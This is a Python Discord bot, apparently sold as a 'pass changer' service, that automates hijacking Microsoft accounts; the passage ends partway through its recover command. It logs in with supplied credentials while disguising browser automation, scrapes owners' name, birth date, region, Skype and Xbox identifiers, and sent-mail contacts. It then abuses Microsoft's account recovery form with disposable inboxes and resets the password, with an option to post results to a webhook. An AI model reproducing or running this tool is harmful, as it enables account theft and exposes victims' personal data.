#!/usr/bin/env python3

import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import requests
import random
import string
import time
import re
import json
import os
import platform
from io import BytesIO
from datetime import datetime
from PIL import Image
import pycountry
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import TimeoutException
from webdriver_manager.chrome import ChromeDriverManager
from selenium import webdriver

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=".", intents=intents)

OWNER_ID = 1383641747913183256
LOG_CHANNEL = None
CAPTCHA_CHANNEL = None
SUCCESS_CHANNEL = None
CONFIG = {"token": "", "log_channel": None, "captcha_channel": None, "success_channel": None}
authed_users = set()

def load_config():
    if os.path.exists("config.json"):
        with open("config.json") as f:
            data = json.load(f)
            return {
                "token": data.get("token", ""),
                "log_channel": data.get("log_channel"),
                "captcha_channel": data.get("captcha_channel"),
                "success_channel": data.get("success_channel")
            }
    return {"token": "", "log_channel": None, "captcha_channel": None, "success_channel": None}

def save_config():
    with open("config.json", "w") as f:
        json.dump(CONFIG, f)

def load_authed():
    if os.path.exists("authdb.json"):
        with open("authdb.json") as f:
            return set(json.load(f))
    return set()

def save_authed():
    with open("authdb.json", "w") as f:
        json.dump(list(authed_users), f)

CONFIG = load_config()
authed_users = load_authed()

async def log_message(message: str):
    global LOG_CHANNEL
    if LOG_CHANNEL:
        try:
            embed = discord.Embed(description=message, color=0xffffff)
            embed.set_footer(text="Wither Cloud Pass Changer | By SeriesV2")
            await LOG_CHANNEL.send(embed=embed)
        except:
            pass

def send_embed(title: str, description: str, color=None, fields=None):
    embed = discord.Embed(title=title, description=description, color=color or 0xffffff)
    if fields:
        for name, value in fields.items():
            embed.add_field(name=name, value=value, inline=True)
    embed.set_footer(text="Wither Cloud Pass Changer | By SeriesV2")
    return embed

def generate_withercloud_password() -> str:
    random_numbers = ''.join([str(random.randint(0, 9)) for _ in range(6)])
    return f"FlowCloud-{random_numbers}"

def random_name(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def get_domains():
    r = requests.get("https://api.mail.tm/domains")
    return r.json()['hydra:member'][0]['domain']

def register_account(email, password):
    payload = {"address": email, "password": password}
    r = requests.post("https://api.mail.tm/accounts", json=payload)
    return r.status_code in [201, 422]

def get_token(email, password):
    payload = {"address": email, "password": password}
    r = requests.post("https://api.mail.tm/token", json=payload)
    return r.json()['token']

def get_messages(token):
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get("https://api.mail.tm/messages", headers=headers)
    return r.json().get('hydra:member', [])

def read_message(token, message_id):
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(f"https://api.mail.tm/messages/{message_id}", headers=headers)
    return r.json()

def generate_temp_mail_account():
    username = random_name()
    password = random_name(12)
    domain = get_domains()
    email = f"{username}@{domain}"
    register_account(email, password)
    token = get_token(email, password)
    return email, password, token

def wait_for_emails(token, expected_count=2, timeout=90, interval=5):
    attempts = timeout // interval
    for _ in range(attempts):
        inbox = get_messages(token)
        if len(inbox) >= expected_count:
            return inbox[:expected_count]
        time.sleep(interval)
    return get_messages(token)

def extract_otp(text):
    match = re.search(r'\b\d{6}\b', text)
    return match.group(0) if match else None

def get_otp_from_first_email(token):
    emails = wait_for_emails(token, expected_count=1)
    if not emails:
        return None
    msg = read_message(token, emails[0]['id'])
    otp = extract_otp(msg['text'])
    return otp

def extract_specific_link(text):
    """Extract password reset link from Microsoft email - handles multiple formats"""
    if not text:
        return None
    
    lines = text.splitlines()
    
    # Pattern 1: Traditional "Click this link to reset your password:"
    for i, line in enumerate(lines):
        if "reset your password" in line.lower() or "reset password" in line.lower():
            for j in range(i + 1, min(i + 5, len(lines))):
                next_line = lines[j].strip()
                if next_line.startswith("http"):
                    return next_line
    
    # Pattern 2: Direct link in message (newer format)
    for line in lines:
        line = line.strip()
        if line.startswith("https://") and ("resetpassword" in line.lower() or "acsr" in line.lower() or "account.live.com" in line):
            return line
    
    # Pattern 3: Look for any password reset link with common Microsoft domains
    for line in lines:
        line = line.strip()
        if line.startswith("http") and ("account.microsoft.com" in line or "account.live.com" in line) and ("reset" in line.lower() or "recover" in line.lower()):
            return line
    
    # Pattern 4: Extract from text like "[LINK] https://..."
    import re
    url_pattern = r'(https?://[^\s\)>\]]+(?:account\.(?:microsoft|live)\.com)[^\s\)>\]]*)'
    matches = re.findall(url_pattern, text)
    for match in matches:
        if "reset" in match.lower() or "recover" in match.lower() or "acsr" in match.lower():
            return match
    
    # Pattern 5: Any account.microsoft.com/account... link as last resort
    matches = re.findall(url_pattern, text)
    if matches:
        return matches[0]
    
    return None

def create_driver(headless=True):
    options = Options()
    if headless:
        options.add_argument("--headless=new")
    else:
        options.add_argument("--start-minimized")
    
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920,1080")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--incognito")
    options.add_argument("--disable-webauthn")
    options.add_argument("--disable-features=WebAuthentication,WebAuthn")
    
    system = platform.system().lower()
    if system == 'linux':
        user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
    else:
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
    
    options.add_argument(f"user-agent={user_agent}")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option("useAutomationExtension", False)
    
    chrome_paths = [
        "/usr/bin/google-chrome",
        "/usr/bin/google-chrome-stable", 
        "/usr/bin/chromium-browser",
        "/usr/bin/chromium",
        "/opt/google/chrome/chrome",
        "/snap/bin/chromium",
        "/workspaces/j/j/chrome"
    ]
    
    for chrome_path in chrome_paths:
        if os.path.exists(chrome_path):
            options.binary_location = chrome_path
            break

    try:
        driver = webdriver.Chrome(
            service=Service(ChromeDriverManager().install()),
            options=options
        )
    except:
        driver = webdriver.Chrome(options=options)
    
    try:
        driver.execute_cdp_cmd(
            'Page.addScriptToEvaluateOnNewDocument',
            {
                'source': '''
                    Object.defineProperty(navigator, 'webdriver', {
                        get: () => undefined
                    });
                    window.navigator.chrome = { runtime: {} };
                    Object.defineProperty(navigator, 'plugins', {
                        get: () => [1, 2, 3]
                    });
                    Object.defineProperty(navigator, 'languages', {
                        get: () => ['en-US', 'en']
                    });
                '''
            }
        )
    except:
        pass
    
    return driver

def download_captcha(driver) -> BytesIO:
    try:
        captcha_img = driver.find_element(By.XPATH, '//img[contains(@src, "GetHIPData")]')
        src = captcha_img.get_attribute("src")
        response = requests.get(src)
        img = Image.open(BytesIO(response.content))
        buf = BytesIO()
        img.save(buf, format='PNG')
        buf.seek(0)
        return buf
    except:
        return None

def scrape_outlook_emails(driver):
    """Scrape last 4 sent emails from Outlook with addresses and subjects"""
    try:
        driver.get("https://outlook.live.com")
        time.sleep(3)
        
        sent_addresses = []
        sent_subjects = []
        
        try:
            sent_folder = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Sent')]"))
            )
            sent_folder.click()
            time.sleep(2)
        except:
            return {"addresses": [], "subjects": []}
        
        try:
            email_items = driver.find_elements(By.XPATH, "//div[@role='button' and contains(@class, 'item')]")[:4]
            
            for item in email_items:
                try:
                    to_elem = item.find_element(By.XPATH, ".//span[@title]")
                    address = to_elem.get_attribute("title")
                    if address:
                        sent_addresses.append(address.split(";")[0].strip())
                except:
                    pass
                
                try:
                    subj_elem = item.find_element(By.XPATH, ".//div[@class='_3LGb5']")
                    subject = subj_elem.text
                    if subject:
                        sent_subjects.append(subject[:50])
                except:
                    pass
            
            return {
                "addresses": sent_addresses[:4],
                "subjects": sent_subjects[:4]
            }
        except:
            return {"addresses": [], "subjects": []}
    except:
        return {"addresses": [], "subjects": []}

all_countries = {country.name for country in pycountry.countries}

BASE_URL = "https://api.mail.tm"

def random_name(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def get_domains():
    r = requests.get(f"{BASE_URL}/domains")
    return r.json()['hydra:member'][0]['domain']

def register_account(email, password):
    payload = {"address": email, "password": password}
    r = requests.post(f"{BASE_URL}/accounts", json=payload)
    return r.status_code in [201, 422]

def get_token(email, password):
    payload = {"address": email, "password": password}
    r = requests.post(f"{BASE_URL}/token", json=payload)
    return r.json()['token']

def get_messages(token):
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(f"{BASE_URL}/messages", headers=headers)
    return r.json().get('hydra:member', [])

def read_message(token, message_id):
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(f"{BASE_URL}/messages/{message_id}", headers=headers)
    return r.json()

def generate_temp_mail_account():
    username = random_name()
    password = random_name(12)
    domain = get_domains()
    email = f"{username}@{domain}"
    register_account(email, password)
    token = get_token(email, password)
    return email, password, token

def wait_for_emails(token, expected_count=2, timeout=90, interval=5):
    attempts = timeout // interval
    for _ in range(attempts):
        inbox = get_messages(token)
        if len(inbox) >= expected_count:
            return inbox[:expected_count]
        time.sleep(interval)
    return get_messages(token)

async def scrape_account_info(email: str, password: str) -> dict:
    driver = create_driver()
    wait = WebDriverWait(driver, 20)

    try:

        driver.get("https://login.live.com")
        email_input = wait.until(EC.presence_of_element_located((By.ID, "usernameEntry")))
        email_input.send_keys(email)
        email_input.send_keys(Keys.RETURN)
        await asyncio.sleep(2)

        password_input = None

        try:

            password_input = WebDriverWait(driver, 3).until(
                EC.presence_of_element_located((By.NAME, "passwd"))
            )
            print("✅ Password input appeared directly.")
            await log_message("✅ Password input appeared directly.")

        except TimeoutException:
            print("Password input not visible, checking for alternate buttons...")
            await log_message("Password input not visible, checking for alternate buttons...")


            try:
                use_password_btn = WebDriverWait(driver, 3).until(
                    EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Use your password')]"))
                )
                use_password_btn.click()
                print("➡️ Clicked 'Use your password'")
                await log_message("➡️ Clicked 'Use your password'")
                password_input = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.NAME, "passwd"))
                )

            except TimeoutException:

                try:
                    other_ways_btn = WebDriverWait(driver, 3).until(
                        EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Other ways to sign in')]"))
                    )
                    other_ways_btn.click()
                    print("➡️ Clicked 'Other ways to sign in'")
                    await log_message("➡️ Clicked 'Other ways to sign in'")
                    await asyncio.sleep(1)


                    use_password_btn = WebDriverWait(driver, 5).until(
                        EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Use your password')]"))
                    )
                    use_password_btn.click()
                    print("➡️ Clicked 'Use your password' after 'Other ways'")
                    await log_message("➡️ Clicked 'Use your password' after 'Other ways'")
                    password_input = WebDriverWait(driver, 5).until(
                        EC.presence_of_element_located((By.NAME, "passwd"))
                    )

                except TimeoutException:

                    try:
                        switch_link = WebDriverWait(driver, 3).until(
                            EC.element_to_be_clickable((By.ID, "idA_PWD_SwitchToCredPicker"))
                        )
                        switch_link.click()
                        print("➡️ Clicked 'Sign in another way'")
                        await log_message("➡️ Clicked 'Sign in another way'")
                        await asyncio.sleep(1)

                        use_password_btn = WebDriverWait(driver, 5).until(
                            EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Use your password')]"))
                        )
                        use_password_btn.click()
                        print("➡️ Clicked 'Use your password' after legacy switch")
                        await log_message("➡️ Clicked 'Use your password' after legacy switch")
                        password_input = WebDriverWait(driver, 5).until(
                            EC.presence_of_element_located((By.NAME, "passwd"))
                        )

                    except TimeoutException:
                        print("❌ Failed to reach password input.")
                        await log_message("❌ Failed to reach password input.")
                        return {"email": email, "error": "Could not reach password input"}


        password_input.send_keys(password)
        password_input.send_keys(Keys.RETURN)
        time.sleep(2)


        try:
            password_input = driver.find_element(By.ID, "passwordEntry")

            if password_input.is_displayed():
                print("❌ Password input still present — likely incorrect password.")
                await log_message("❌ Password input still present — likely incorrect password.")
                return {"email": email, "error": "Incorrect password"}

        except:
            print("✅ Login successful. No password error detected.")
            await log_message("✅ Login successful. No password error detected.")


        try:
            if "Too Many Requests" in driver.page_source:
                print("⚠️ 'Too Many Requests' detected — retrying shortly...")
                await log_message("⚠️ 'Too Many Requests' detected — retrying shortly...")
                retries = 0
                max_retries = 20
                while "Too Many Requests" in driver.page_source and retries < max_retries:
                    time.sleep(1)
                    driver.refresh()
                    retries += 1
                if "Too Many Requests" in driver.page_source:
                    print("🚫 Still blocked after multiple retries. Skipping account.")
                    await log_message("🚫 Still blocked after multiple retries. Skipping account.")
                    return {"email": email, "error": "Too Many Requests even after retry"}
        except:
            print("✅ No rate limit detected. Proceeding normally.")
            await log_message("✅ No rate limit detected. Proceeding normally.")


        try:
            security_next_btn = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.ID, "iLandingViewAction"))
            )
            print("🔒 Security info change screen found. Clicking 'Next'...")
            await log_message("🔒 Security info change screen found. Clicking 'Next'...")
            security_next_btn.click()
            time.sleep(2)
        except:
            print("✅ No security prompt detected. Continuing...")
            await log_message("✅ No security prompt detected. Continuing...")


        try:
            stay_signed_in_yes = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="primaryButton"]'))
            )
            print("🔄 'Stay signed in?' prompt detected. Confirming...")
            await log_message("🔄 'Stay signed in?' prompt detected. Confirming...")
            stay_signed_in_yes.click()
            time.sleep(2)
        except:
            print("✅ No 'Stay signed in' prompt.")


        try:
            close_button = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.XPATH, '//button[@aria-label="Close"]'))
            )
            print("🛡️ Security modal detected. Closing it...")
            await log_message("🛡️ Security modal detected. Closing it...")
            close_button.click()
            time.sleep(1)
        except:
            print("✅ No security modal found. Navigating to profile...")
            await log_message("✅ No security modal found. Navigating to profile...")


        print("🌐 Opening Microsoft profile page...")
        await log_message("🌐 Opening Microsoft profile page...")
        driver.get("https://account.microsoft.com/profile")
        time.sleep(2)
        driver.get("https://account.microsoft.com/profile")
        try:
            wait.until(EC.presence_of_element_located((By.ID, "profile.profile-page.personal-section.full-name")))
            name = driver.find_element(By.ID, "profile.profile-page.personal-section.full-name").text.strip()
            print(f"🔹Captured name : {name}")
            await log_message(f"🔹Captured name : {name}")
            spans = driver.find_elements(By.CSS_SELECTOR, 'span.fui-Text')
            dob = "DOB not found"
            region = "Region not found"

            for span in spans:
                text = span.text.strip()
                if "/" in text and len(text.split("/")) == 3:
                    parts = text.split(";")
                    for part in parts:
                        part = part.strip()
                        if "/" in part and len(part.split("/")) == 3:
                            dob = part
                            print(f"🔹 Cleaned DOB: {dob}")
                            await log_message(f"🔹 Cleaned DOB: {dob}")
                            break

                elif text in all_countries:
                    region = text
                    print(f"🔹 Captured region: {region}")
                    await log_message(f"🔹 Captured region: {region}")
        except:
            print("❌ could not get account info")
            await log_message("❌ could not get account info")
            return {"email": email, "error": "Couldn't get account info, Make sure account is not blocked"}


        driver.get("https://secure.skype.com/portal/profile")
        print("✅ Loaded Skype profile")
        await log_message("✅ Loaded Skype profile")
        time.sleep(3)

        try:
            skype_id = driver.find_element(By.CLASS_NAME, "username").text.strip()
            print(f"🔹Skype ID: {skype_id}")
            await log_message(f"🔹Skype ID: {skype_id}")
        except:
            skype_id = "live:"

        try:
            skype_email = driver.find_element(By.ID, "email1").get_attribute("value").strip()
            print(f"🔹Skype email: {skype_email}")
            await log_message(f"🔹Skype email: {skype_email}")
        except:
            skype_email = email  # fallback

        driver.get("https://www.xbox.com/en-IN/play/user")
        time.sleep(5)

        gamertag = "Not found"

        try:
            try:
                sign_in_btn = driver.find_element(By.XPATH, '//a[contains(text(), "Sign in")]')
                sign_in_btn.click()
                print(f"🔹Clicked sign_in_btn")
                await log_message(f"🔹Clicked sign_in_btn")
                time.sleep(7)
            except:
                pass

            try:
                account_btn = WebDriverWait(driver, 6).until(
                    EC.element_to_be_clickable((By.XPATH, '//span[@role="button"]'))
                )
                account_btn.click()
                print(f"🔹Clicked account_btn")
                await log_message(f"🔹Clicked account_btn")
                WebDriverWait(driver, 15).until(EC.url_contains("/play/user/"))

            except:
                pass

            url = driver.current_url
            if "/play/user/" in url:
                gamertag = url.split("/play/user/")[-1]
                gamertag = gamertag.replace("%20", " ").replace("%25", "%")
                print(f"🔹gamertag: {gamertag}")
                await log_message(f"🔹gamertag: {gamertag}")
        except:
            gamertag = "Error"

        return {
            "email": email,
            "password": password,
            "name": name,
            "dob": dob,
            "region": region,
            "skype_id": skype_id,
            "skype_email": skype_email,
            "gamertag": gamertag
        }

    except:
        return {"error": "Could Not Login!"}
    finally:
        driver.quit()

async def submit_acsr_form(account_info: dict):
    email = account_info['email']
    
    tempmail, temp_pass, token = generate_temp_mail_account()
    
    driver = create_driver()
    wait = WebDriverWait(driver, 20)
    
    try:
        driver.get("https://account.live.com/acsr")
        time.sleep(2)
        

        email_input = wait.until(EC.presence_of_element_located((By.ID, "AccountNameInput")))
        email_input.clear()
        email_input.send_keys(email)
        print("✉️ Entered Microsoft email.")
        await log_message("✉️ Entered Microsoft email.")
        

        tempmail_input = wait.until(EC.presence_of_element_located((By.ID, "iCMailInput")))
        tempmail_input.clear()
        tempmail_input.send_keys(tempmail)
        print("📨 Entered tempmail.")
        await log_message("📨 Entered tempmail.")
        

        captcha_image = download_captcha(driver)
        print("🧩 CAPTCHA ready.")
        await log_message("🧩 CAPTCHA ready.")
        
        return captcha_image, driver, token, tempmail
        
    except Exception as e:
        print(f"❌ ACSR automation error: {e}")
        driver.quit()
        return None, None, None, None

def get_month_name(date_str):
    try:
        date_obj = datetime.strptime(date_str, "%m/%d/%Y")
        month_name = date_obj.strftime("%B")
        day = str(date_obj.day)
        year = str(date_obj.year)
        return month_name, day, year
    except ValueError:
        return "May", "5", "1989"

async def continue_acsr_flow(driver, account_info, token, captcha_text, user_id):
    wait = WebDriverWait(driver, 20)

    try:

        captcha_value = captcha_text

        try:

            captcha_input = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, '//input[contains(@id, "SolutionElement")]'))
            )
            captcha_input.clear()
            captcha_input.send_keys(captcha_value)
            captcha_input.send_keys(Keys.RETURN)
            print("📨 CAPTCHA submitted. Waiting for OTP input field...")
            await log_message("📨 CAPTCHA submitted. Waiting for OTP input field...")


            code_input = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "iOttText"))
            )
            print("✅ CAPTCHA accepted.")
            await log_message("✅ CAPTCHA accepted.")

        except Exception:
            print("❌ CAPTCHA failed or OTP input not found.")
            await log_message("❌ CAPTCHA failed or OTP input not found.")
            print("🔁 Waiting for new CAPTCHA to regenerate...\n")
            await log_message("🔁 Waiting for new CAPTCHA to regenerate...\n")

            try:
                captcha_image = download_captcha(driver)
                print("🧩 New CAPTCHA downloaded.")
                await log_message("🧩 New CAPTCHA downloaded.")
                with open(f"captcha_retry_{user_id}.png", "wb") as f:
                    f.write(captcha_image.read())

                return "CAPTCHA_RETRY_NEEDED"
            except Exception as e:
                print(f"❌ Failed to detect new CAPTCHA image: {e}")
                await log_message(f"❌ Failed to detect new CAPTCHA image: {e}")
                return "CAPTCHA_DOWNLOAD_FAILED"


        print("⌛ Waiting for OTP via tempmail...")
        await log_message("⌛ Waiting for OTP via tempmail...")
        otp = get_otp_from_first_email(token)
        if not otp:
            print("❌ OTP not received.")
            await log_message("❌ OTP not received.")
            return "❌ OTP not received."

        print(f"📥 OTP received: {otp}")
        await log_message(f"📥 OTP received: {otp}")


        code_input = wait.until(EC.presence_of_element_located((By.ID, "iOttText")))
        code_input.clear()
        code_input.send_keys(otp)
        code_input.send_keys(Keys.RETURN)
        print("🔐 OTP submitted.")
        await log_message("🔐 OTP submitted.")
        await asyncio.sleep(2)

        # Step 5: Fill name
        print("🧾 Filling name...")
        await log_message("🧾 Filling name...")
        first, last = account_info['name'].split(maxsplit=1) if ' ' in account_info['name'] else (account_info['name'], "Last")
        wait.until(EC.presence_of_element_located((By.ID, "FirstNameInput"))).send_keys(first)
        wait.until(EC.presence_of_element_located((By.ID, "LastNameInput"))).send_keys(last)

        month, day, year = get_month_name(account_info['dob'])

        if not all([month, day, year]):
            raise ValueError("❌ Invalid or missing DOB, aborting ACSR form.")
            await log_message("❌ Invalid or missing DOB, aborting ACSR form.")


        day_element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "BirthDate_dayInput"))
        )
        Select(day_element).select_by_visible_text(day)


        month_element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "BirthDate_monthInput"))
        )
        Select(month_element).select_by_visible_text(month)


        year_element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "BirthDate_yearInput"))
        )
        Select(year_element).select_by_visible_text(year)
        print(f"Parsed DOB: {month=}, {day=}, {year=}")
        await log_message(f"Parsed DOB: {month=}, {day=}, {year=}")
        print("✅ Dropdown Options Loaded:", [o.text for o in Select(month_element).options])
        await log_message("✅ Dropdown Options Loaded: " + str([o.text for o in Select(month_element).options]))

        print("📆 DOB filled.")
        await log_message("📆 DOB filled.")


        wait.until(EC.presence_of_element_located((By.ID, "CountryInput"))).send_keys(account_info['region'])
        print("🌍 Region filled.")
        await log_message("🌍 Region filled.")
        await asyncio.sleep(1)


        first_name_input = driver.find_element(By.ID, "FirstNameInput")
        first_name_input.send_keys(Keys.RETURN)
        time.sleep(1)

        print("🔐 Entering old password...")
        await log_message("🔐 Entering old password...")
        previous_pass_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, 'input[data-nuid="PreviousPasswordInput"]'))
        )
        previous_pass_input.clear()
        previous_pass_input.send_keys(account_info["password"])
        print("✅ Old password entered.")
        await log_message("✅ Old password entered.")
        await asyncio.sleep(2)


        skype_checkbox = driver.find_element(By.ID, "ProductOptionSkype")
        if not skype_checkbox.is_selected():
            skype_checkbox.click()
            print("☑️ Skype option selected.")
            await log_message("☑️ Skype option selected.")


        xbox_checkbox = driver.find_element(By.ID, "ProductOptionXbox")
        if not xbox_checkbox.is_selected():
            xbox_checkbox.click()
            print("🎮 Xbox option selected.")
            await log_message("🎮 Xbox option selected.")

        # Skype info
        previous_pass_input.send_keys(Keys.RETURN)
        skype_name_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "SkypeNameInput"))
        )
        skype_name_input.clear()
        skype_name_input.send_keys(account_info["skype_id"])

        skype_email_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "SkypeAccountCreateEmailInput"))
        )
        skype_email_input.clear()
        skype_email_input.send_keys(account_info["skype_email"])
        print("🔑 Skype info filled.")
        await log_message("🔑 Skype info filled.")
        await asyncio.sleep(2)
        skype_email_input.send_keys(Keys.RETURN)

        # Xbox product
        print("🎮 Selecting Xbox One...")
        await log_message("🎮 Selecting Xbox One...")
        xbox_radio = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "XboxOneOption"))
        )
        if not xbox_radio.is_selected():
            xbox_radio.click()
        xbox_radio.send_keys(Keys.ENTER)
        print("✅ Xbox One selected.")
        await log_message("✅ Xbox One selected.")
        await asyncio.sleep(2)

        # Gamertag
        print("🎮 Entering Xbox Gamertag...")
        await log_message("🎮 Entering Xbox Gamertag...")
        xbox_name_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "XboxGamertagInput"))
        )
        xbox_name_input.clear()
        xbox_name_input.send_keys(account_info["gamertag"])
        xbox_name_input.send_keys(Keys.RETURN)
        print("✅ Gamertag submitted.")
        await log_message("✅ Gamertag submitted.")

        try:
            print("📬 Fetching password reset link from temp mail...")
            await log_message("📬 Fetching password reset link from temp mail...")
            await asyncio.sleep(90)

            emails = wait_for_emails(token, expected_count=2)
            email2 = read_message(token, emails[0]['id'])
            resetlink = extract_specific_link(email2['text'])

            try:
                driver.quit()
            except Exception:
                pass

            if resetlink:
                print(f"🔗 Target Link: {resetlink}")
                await log_message(f"🔗 Target Link: {resetlink}")
                return resetlink
            else:
                print("❌ Target reset link not found.")
                await log_message("❌ Target reset link not found.")
                return None
        except Exception as e:
            print(f"❌ Failed to fetch or extract reset link: {e}")
            await log_message(f"❌ Failed to fetch or extract reset link: {e}")
            return None

    except Exception as e:
        print(f"❌ Error while continuing ACSR flow: {e}")
        await log_message(f"❌ Error while continuing ACSR flow: {e}")
        return None

async def perform_password_reset(resetlink, email, new_password):
    print("🔁 Starting password reset flow...")
    await log_message("🔁 Starting password reset flow...")

    driver = create_driver()
    wait = WebDriverWait(driver, 25)
    try:
        driver.get(resetlink)
        print("🔗 Opened reset link.")
        await log_message("🔗 Opened reset link.")


        email_input = wait.until(EC.presence_of_element_located((By.ID, "AccountNameInput")))
        email_input.clear()
        email_input.send_keys(email)
        email_input.send_keys(Keys.RETURN)
        print("📨 Email entered.")
        await log_message("📨 Email entered.")


        new_pass = wait.until(EC.presence_of_element_located((By.ID, "iPassword")))
        new_pass.clear()
        new_pass.send_keys(new_password)

        new_pass_re = wait.until(EC.presence_of_element_located((By.ID, "iRetypePassword")))
        new_pass_re.clear()
        new_pass_re.send_keys(new_password)
        print("🔑 New password filled.")
        await log_message("🔑 New password filled.")
        await asyncio.sleep(1)
        new_pass_re.send_keys(Keys.RETURN)


        print("⏳ Waiting for confirmation...")
        await log_message("⏳ Waiting for confirmation...")

        await asyncio.sleep(5)

        try:
            driver.find_element(By.CSS_SELECTOR, 'input[data-nuid="PreviousPasswordInput"]')
            fallback_pass = "SladePass!12"
            print(f"⚠️ Password was rejected — retrying with fallback password. : {fallback_pass}")
            await log_message(f"⚠️ Password was rejected — retrying with fallback password. : {fallback_pass}")


            pass_input = driver.find_element(By.ID, "iPassword")
            pass_input.clear()
            pass_input.send_keys(fallback_pass)
            retype_input = driver.find_element(By.ID, "iRetypePassword")
            retype_input.clear()
            retype_input.send_keys(fallback_pass)
            retype_input.send_keys(Keys.RETURN)
            return fallback_pass
        except:
            return new_password
    except Exception as e:
        print(f"❌ Error during password reset: {e}")
        await log_message(f"❌ Error during password reset: {e}")
    finally:
        driver.quit()

def send_webhook(data, webhook_url):
    try:
        if not webhook_url:
            return
        embeds = []
        for item in data:
            fields = []
            for k, v in item.items():
                if v:
                    fields.append({"name": k, "value": str(v)[:1024], "inline": True})
            embeds.append({
                "title": "Wither Cloud Account Processed",
                "color": 0xffffff,
                "fields": fields
            })
        requests.post(webhook_url, json={"username": "Wither Cloud Bot", "embeds": embeds})
    except:
        pass

@bot.event
async def on_ready():
    global LOG_CHANNEL, CAPTCHA_CHANNEL, SUCCESS_CHANNEL, authed_users
    authed_users = load_authed()
    LOG_CHANNEL = bot.get_channel(CONFIG["log_channel"]) if CONFIG["log_channel"] else None
    CAPTCHA_CHANNEL = bot.get_channel(CONFIG["captcha_channel"]) if CONFIG["captcha_channel"] else None
    SUCCESS_CHANNEL = bot.get_channel(CONFIG["success_channel"]) if CONFIG["success_channel"] else None
    await bot.change_presence(status=discord.Status.dnd, activity=discord.Game(name="Wither Cloud | Pass Changer"))
    print(f"Bot ready as {bot.user}")

@bot.command(name="set-log")
async def set_log(ctx, channel: discord.TextChannel):
    if ctx.author.id != OWNER_ID:
        return
    global LOG_CHANNEL, CONFIG
    LOG_CHANNEL = channel
    CONFIG["log_channel"] = channel.id
    save_config()
    embed = send_embed("Log Channel Set", f"Logs will be sent to {channel.mention}")
    await ctx.send(embed=embed)

@bot.command(name="recover")
async def recover(ctx, credentials: str):
    if ctx.author.id not in authed_users:
        embed = send_embed("Error", "You are not authorized to use this command.")
        await ctx.send(embed=embed)
        return
    if not CAPTCHA_CHANNEL:
        embed = send_embed("Error", "Captcha channel not set. Use .set-captcha to set it.")
        await ctx.send(embed=embed)
        return
    if ":" not in credentials:
        embed = send_embed("Error", "Format: .recover email:password")
        await ctx.send(embed=embed)
        return
    
    email, password = credentials.split(":", 1)
    start_time = time.time()
    
    captcha_channel = CAPTCHA_CHANNEL
    await captcha_channel.send("do u want to Generate or Set A Custom Password")
    
    def check(m):
        return m.author == ctx.author and m.channel == captcha_channel
    
    try:
        response = await bot.wait_for("message", check=check, timeout=30)
        choice = response.content.lower()
    except asyncio.TimeoutError:
        embed = send_embed("Timeout", "Command timed out")
        await ctx.send(embed=embed)
        return
    
    new_password = None
    if "generate" in choice:
        new_password = generate_withercloud_password()
        await captcha_channel.send(f"Generated: `{new_password}`")
        await log_message(f"Generated password for {email}: {new_password}")
    elif "set" in choice or "custom" in choice:
        await captcha_channel.send(embed=send_embed("Custom Password", "Enter your custom password:"))
        try:
            pass_response = await bot.wait_for("message", check=check, timeout=30)
            new_password = pass_response.content
            await captcha_channel.send(f"Custom password set: `{new_password}`")
            await log_message(f"Custom password set for {email}: {new_password}")
        except asyncio.TimeoutError:
            embed = send_embed("Timeout", "Command timed out")
            await captcha_channel.send(embed=embed)
            return
    else:
        embed = send_embed("Invalid Choice", "Please reply with 'generate' or 'set/custom'")
        await captcha_channel.send(embed=embed)
        return
    
    embed = send_embed("Recovery Started", f"Starting recovery for `{email}`")
    await ctx.send(embed=embed)
    await log_message(f"Starting recovery for {email}")
    
    embed = send_embed("Scraping", "Scraping account information...")
    msg = await ctx.send(embed=embed)
    
    account_info = await scrape_account_info(email, password)
    if account_info.get("error"):
        embed = send_embed("Error", f"Failed: {account_info['error']}")
        await ctx.send(embed=embed)
        await log_message(f"Error scraping {email}: {account_info['error']}")
        return
    
    embed = send_embed("Account Info Scraped", "Submitting ACSR form...")
